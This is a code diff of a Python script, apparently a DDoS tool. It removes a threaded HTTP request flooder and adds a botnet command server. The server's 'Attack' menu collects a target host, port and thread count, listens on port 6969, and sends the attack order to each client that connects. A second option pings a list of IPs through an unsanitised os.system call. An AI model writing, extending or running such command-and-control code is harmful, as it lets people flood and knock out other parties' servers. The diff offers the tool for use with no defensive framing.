@@ -61,56 +61,94 @@ print("""\033[31m
 time.sleep(2)
 
 
-import threading
-import time
-import sys
+import socket
 import os
-
-import requests
-
-
-class Ping():
-    def __init__(self, url, threads):
-        self.target = url
-        self.threads = threads
-        self.total = [0, 0]
-
-        for thread in range(int(threads)):
-            threading.Thread(target=self.ping, args=[url]).start()
-            print(f"Thread{thread+1} started!")
-
-        self.display()
+import subprocess
 
 
-    def display(self):
+
+
+
+
+def main():
+
+
+
+    
+    menu = input("""
+------------------------------
+1. Attack
+2. Ping ips
+3. Exit
+------------------------------
+> """)
+
+    if menu == "1": # attack
+        target = input(">Please input the IP or the Host name to Attack>> ")
+        port = input(">Please input the port (80 by default)>> ")
+        if port == "":
+            port = "80"
+        threads = input(">Please input the numbrer of threads you want>> ")
+
+        sendData = (target + ":" + port + ":" + threads)
+
+        print("------------------------------")
+        print("Ip's Connected: ")
+
+        
+        host = ""#put your server ip here
+        port = 6969
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((host, port))
+        sendData = sendData.encode("utf8")
         while True:
-            time.sleep(0.1)
-            os.system(cc)
-            print("Ping")
-            print("by @rzet595\n")
-            print(f"TARGET URL -> {self.target}")
-            print(f"THREADS -> {self.threads}\n")
-            print(f"SENT PACKAGES -> {self.total[0]}")
-            print(f"ERRORS -> {self.total[1]}")
+            s.listen(10)
+            conn, addr = s.accept()
+            print("[+] Connected by: " + str(addr))
+            conn.sendall(sendData)
+
+        
 
 
 
 
-    def ping(self, url):
-        while True:
-            code = requests.get(url).status_code
-
-            self.total[0] += 1
-            if code > 299 or code < 200:
-                self.total[1] += 1
+    
 
 
-def parse_args():
-    parse_args = {}
-    args = sys.argv
-    for item in range(len(args)):
-        if args[item].startswith("--"):
-            arg = args[item].replace("--", "")
-            value = args[item+1]
+    
+    elif menu == "2": #ping ips
 
-            parse_args[arg] = value
+        print("------------------------------")
+        File = input(">Plese input the name of the .txt of ips>> ")
+        print("------------------------------")
+        ips = []
+        online = 0
+        try:
+            f = open(File, "r")
+        except:
+            print("[-] ERROR file not found!")
+            main()
+
+        for lines in f:
+            ips.append(lines)
+        
+        f.close()
+        for i in range (len(ips)):
+            ip = ips[i]
+            
+            response = os.system("ping -n 1 " + ip)
+
+            if response == 0:
+                print("[+] " + ip + " is ONLINE")
+                online = online + 1
+            else:
+                print("[-] " + ip + " is OFFLINE!")
+
+        print("------------------------------")
+        print("Totel Online IPs: " + str(online))
+        main()
+    
+    else:
+        exit()
+    
+main()
